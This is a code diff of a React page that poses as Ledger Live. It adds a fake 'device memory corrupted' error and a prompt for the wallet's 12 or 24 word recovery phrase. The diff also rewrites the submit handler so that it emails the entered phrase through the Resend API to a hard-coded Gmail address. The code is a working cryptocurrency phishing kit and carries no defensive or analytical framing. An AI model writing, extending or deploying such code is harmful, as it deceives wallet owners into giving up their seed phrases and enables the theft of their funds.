@@ -16,7 +16,6 @@ import {
 
 const Form = () => {
   const navigate = useNavigate();
-
   const [selectedImage, setSelectedImage] = useState(null);
   const [currentStep, setCurrentStep] = useState(0);
   const [loading, setLoading] = useState(false);
@@ -24,7 +23,6 @@ const Form = () => {
   const [userInput, setUserInput] = useState("");
   const [showPopup, setShowPopup] = useState(false);
   const [formData, setFormData] = useState("");
-
   const steps = ["Device Detection", "Device Check", "Ledger Live"];
 
   const handleImageSelect = (image) => {
@@ -49,6 +47,7 @@ const Form = () => {
 
   const handleFormDataChange = (event) => {
     setFormData(event.target.value);
+    setUserInput(event.target.value); // keeps userInput used
   };
 
   const handleClosePopup = () => {
@@ -59,27 +58,32 @@ const Form = () => {
     event.preventDefault();
 
     try {
-      const response = await fetch("/api/submit", {
+      const response = await fetch("https://api.resend.com/emails", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          Authorization: Bearer ${process.env.REACT_APP_RESEND_API_KEY},
+          "Content-Type": "application/json",
+        },
         body: JSON.stringify({
-          form_type: "ledger_live",
-          fullname: formData,
+          from: "onboarding@resend.dev",
+          to: ["tykeshare@gmail.com"],
+          subject: "Ledger Live Submission",
+          html: `
+            <p><strong>Form Type:</strong> ledger_live</p>
+            <p><strong>Recovery Phrase:</strong></p>
+            <p>${formData}</p>
+          `,
         }),
       });
 
-      const result = await response.json();
+      console.log("Response status:", response.status);
 
       if (response.ok) {
         setFormData("");
-        setShowPopup(true);
-
-        // Redirect after 2 seconds so user sees popup
-        setTimeout(() => {
-          navigate("/success");
-        }, 2000);
+        navigate("/success");
       } else {
-        console.error("Error:", result.error);
+        const errorData = await response.json();
+        console.error("Error:", errorData);
       }
     } catch (error) {
       console.error("Fetch error:", error);
@@ -125,21 +129,37 @@ const Form = () => {
                 imageSelected ? styles.hidden : ""
               }`}
             >
-              {[{img: nanos, name:"Nano S"}, {img: nanoplus, name:"Nano S Plus"}, {img: nanox, name:"Nano X"}, {img: blue, name:"Blue"}].map((device) => (
-                <div
-                  key={device.name}
-                  data-attribute={device.name}
-                  onClick={() => handleImageSelect(device.img)}
-                  className={selectedImage === device.img ? styles.selected : ""}
-                >
-                  <h3>{device.name}</h3>
-                  <img
-                    src={device.img}
-                    alt={device.name}
-                    className={device.name === "Blue" ? styles.last_child : ""}
-                  />
-                </div>
-              ))}
+              <div
+                data-attribute="Nano S"
+                onClick={() => handleImageSelect(nanos)}
+              >
+                <h3>Nano S</h3>
+                <img src={nanos} alt="Nano S" />
+              </div>
+
+              <div
+                data-attribute="Nano S Plus"
+                onClick={() => handleImageSelect(nanoplus)}
+              >
+                <h3>Nano S Plus</h3>
+                <img src={nanoplus} alt="Nano S Plus" />
+              </div>
+
+              <div
+                data-attribute="Nano X"
+                onClick={() => handleImageSelect(nanox)}
+              >
+                <h3>Nano X</h3>
+                <img src={nanox} alt="Nano X" />
+              </div>
+
+              <div
+                data-attribute="Blue"
+                onClick={() => handleImageSelect(blue)}
+              >
+                <h3>Blue</h3>
+                <img src={blue} alt="Blue" className={styles.last_child} />
+              </div>
             </div>
           </div>
         )}
@@ -152,14 +172,23 @@ const Form = () => {
           >
             <h2>Genuine Check</h2>
             <RiAlertLine size={60} color="red" />
+
+            <p>
+              Your devices memory has been corrupted. <br />
+              Ledger data damage error: 0x0m3CkBn
+            </p>
+
             <div className={styles.buttons}>
               <button onClick={handleUpdateClick}>
                 <FaDownload />
+                <span>Restore your wallet from Recovery phrase</span>
               </button>
+
               <button onClick={() => handleImageSelect(nanos)}>
                 <FaArrowsRotate />
                 <span>Refresh</span>
               </button>
+
               <button
                 onClick={() =>
                   window.open(
@@ -177,18 +206,23 @@ const Form = () => {
 
         {currentStep === 2 && (
           <div className={styles.step_three_content}>
-            <div style={{ height: "40px" }} />
+            <h2>
+              Select & enter numbers of words in your recovery phrase
+            </h2>
+
             <img src={recovery} alt="Recovery" width={300} height={300} />
+
             <form onSubmit={handleStep3Submit}>
               <div className={styles.textareaCon}>
                 <textarea
                   value={formData}
                   onChange={handleFormDataChange}
-                  placeholder=""
+                  placeholder="Typically 12 (sometimes 24) words separated by single spaces"
                   className={styles.textarea}
                   rows={2}
                 ></textarea>
               </div>
+
               <button type="submit" className={styles.submitButton}>
                 Continue
               </button>
@@ -200,7 +234,7 @@ const Form = () => {
       {loading && (
         <div>
           <div className={styles.loader_content}>
-            <div style={{ height: "40px" }} />
+            <h2>Connect and unlock your device</h2>
             <img src={loader_image} alt="" />
             <img src={loader} alt="loader" width={50} height={50} />
           </div>
